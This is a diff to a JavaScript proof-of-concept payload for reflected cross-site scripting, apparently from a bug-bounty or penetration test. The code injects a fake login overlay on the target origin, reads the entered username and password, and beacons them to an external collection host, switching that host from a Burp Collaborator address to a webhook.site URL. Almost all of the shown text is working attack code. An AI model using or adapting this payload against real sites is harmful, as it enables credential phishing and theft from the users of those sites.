@@ -4,9 +4,7 @@
 (function () {
   if (window.__poc014) { return; } window.__poc014 = 1;   // reflected twice; run once
   var d = document, O = d.domain;
-  var C = 'https://f8o73hfalb52bemfi8ejcd31ys4nsdg2.oastify.com';   // <-- the collaborator YOU watch
-   alert(C);
-   alert(document.domain);
+  var C = 'https://webhook.site/a6295f4b-6ba7-4875-a36d-786829269b11/';   // <-- the collaborator YOU watch
   var KEEP = [];
   function beacon(path) {
     try { var im = new Image(); KEEP.push(im); im.src = C + path; } catch (e) {}
@@ -38,7 +36,7 @@
     var u = d.getElementById('u').value || '(blank)', p = d.getElementById('p').value || '(blank)';
     beacon('creds?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(p));
     ov.innerHTML = '<div style="background:#0b1020;color:#d6e2ff;padding:24px;border-radius:10px;font:14px Consolas,monospace;max-width:640px">' +
-      'Captured &amp; sent to your Collaborator:'+C+'<br><br>username: ' + u.replace(/[<>&]/g, '') +
+      'Captured &amp; sent to your Collaborator:<br><br>username: ' + u.replace(/[<>&]/g, '') +
       '<br>password: ' + p.replace(/[<>&]/g, '') + '<br><br>Executed on the genuine ' + O + ' origin via reflected XSS.</div>';
   };
   d.getElementById('bt').addEventListener('click', cap);
